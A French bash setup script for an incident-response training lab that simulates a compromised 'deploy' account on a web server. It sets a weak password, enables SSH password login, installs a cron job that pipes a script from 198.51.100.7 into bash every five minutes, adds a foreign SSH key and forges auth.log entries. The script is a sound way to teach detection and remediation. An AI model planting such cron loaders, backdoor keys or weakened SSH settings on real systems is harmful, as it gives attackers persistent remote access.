#!/usr/bin/env bash
# break_PC_3_1.sh — ticket PC.3.1 (lab-web) : compte de service compromis.
# Idempotent. Sauvegarde dans /root/.breakfix-backup/.
# Aucune vraie attaque : on pose un artefact et quelques lignes de journal
# de démonstration pour l'exercice d'analyse.
set -euo pipefail
[ "$(id -u)" -eq 0 ] || { echo "à lancer avec sudo" >&2; exit 1; }
SAUV=/root/.breakfix-backup; ID=PC_3_1; mkdir -p "$SAUV"
getent passwd deploy >/dev/null \
  || { echo "lance d'abord setup_P3.sh (rôle web)" >&2; exit 1; }
cat /proc/sys/kernel/random/boot_id > "$SAUV/$ID.boot_id"
date +%s > "$SAUV/$ID.debut"
cp -a /etc/ssh/sshd_config "$SAUV/$ID.sshd_config" 2>/dev/null || true

# 1. Mauvaise pratique laissée en place : mot de passe activé sur deploy
#    « le temps de la migration ».
echo 'deploy:deploy2024' | chpasswd
mkdir -p /etc/ssh/sshd_config.d
printf 'PasswordAuthentication yes\n' > /etc/ssh/sshd_config.d/05-migration.conf
touch -d '3 weeks ago' /etc/ssh/sshd_config.d/05-migration.conf
[ -d /run/systemd/system ] && systemctl reload ssh 2>/dev/null || true

# 2. Artefact déposé par « l'attaquant » : une tâche cron cachée dans le
#    crontab de deploy, plus une clé publique étrangère ajoutée.
crontab -u deploy -l 2>/dev/null > "$SAUV/$ID.deploy.crontab" || true
printf '*/5 * * * * curl -s http://198.51.100.7/x.sh | bash\n' \
  | crontab -u deploy -
AK=/home/deploy/.ssh/authorized_keys
[ -f "$SAUV/$ID.authorized_keys" ] || cp -a "$AK" "$SAUV/$ID.authorized_keys"
ETR='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIINTRUSlabDEMOkeyNONreelle00000000000000 attaquant@inconnu'
grep -qF 'attaquant@inconnu' "$AK" 2>/dev/null || echo "$ETR" >> "$AK"
chown deploy:deploy "$AK"; chmod 0600 "$AK"

# 3. Quelques lignes de journal de démonstration (jeu de données de lab,
#    IP de documentation 198.51.100.0/24, RFC 5737). Volontairement courtes.
LOG=/var/log/auth.log
H=$(hostname -s)
touch "$LOG"; chown syslog:adm "$LOG" 2>/dev/null || true
if ! grep -q 'DEMO-PC31' "$LOG"; then
  D=$(date '+%b %e %H:%M:%S')
  {
    printf '%s %s sshd[4711]: Failed password for deploy from 198.51.100.7 port 51314 ssh2 # DEMO-PC31\n' "$D" "$H"
    printf '%s %s sshd[4712]: Failed password for deploy from 198.51.100.7 port 51320 ssh2 # DEMO-PC31\n' "$D" "$H"
    printf '%s %s sshd[4750]: Accepted password for deploy from 198.51.100.7 port 51402 ssh2 # DEMO-PC31\n' "$D" "$H"
    printf '%s %s sshd[4750]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0) # DEMO-PC31\n' "$D" "$H"
    printf '%s %s CRON[4801]: pam_unix(cron:session): session opened for user deploy(uid=1001) # DEMO-PC31\n' "$D" "$H"
  } >> "$LOG"
fi

cat <<'EOF'

Symptôme attendu : le SIEM a levé l'alerte « connexion réussie après
échecs répétés » sur le compte deploy de lab-web. On te demande de
confirmer ou d'infirmer une compromission, de contenir, et de remédier.
EOF
